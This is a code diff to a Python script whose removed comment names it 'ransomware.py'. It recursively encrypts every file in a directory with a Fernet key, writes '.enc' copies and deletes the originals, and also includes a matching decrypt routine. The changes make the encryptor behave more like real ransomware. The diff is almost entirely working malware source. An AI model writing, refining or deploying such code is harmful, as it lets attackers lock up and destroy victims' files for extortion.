@@ -38,8 +38,10 @@ def encrypt_directory(directory, key):
                 with open(filepath, "rb") as file_obj:
                     file_data = file_obj.read()
                 encrypted_data = f.encrypt(file_data)
-                with open(filepath, "wb") as file_obj:
+                encrypted_filepath = filepath + ".enc"
+                with open(encrypted_filepath, "wb") as file_obj:
                     file_obj.write(encrypted_data)
+                os.remove(filepath)  # Delete the original file
         messagebox.showinfo("Success", "All files encrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Encryption failed: {e}")
@@ -49,15 +51,17 @@ def decrypt_directory(directory, key):
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Skip desktop.ini and ransomware.py
-                if file.lower() in ["desktop.ini", "ransomware.py"]:
+                # Process only files with the .enc extension
+                if not file.endswith(".enc"):
                     continue
                 filepath = os.path.join(root, file)
                 with open(filepath, "rb") as file_obj:
                     encrypted_data = file_obj.read()
                 decrypted_data = f.decrypt(encrypted_data)
-                with open(filepath, "wb") as file_obj:
+                decrypted_filepath = filepath[:-4]  # Remove the .enc extension
+                with open(decrypted_filepath, "wb") as file_obj:
                     file_obj.write(decrypted_data)
+                os.remove(filepath)  # Delete the encrypted file
         messagebox.showinfo("Success", "All files decrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Decryption failed: {e}")
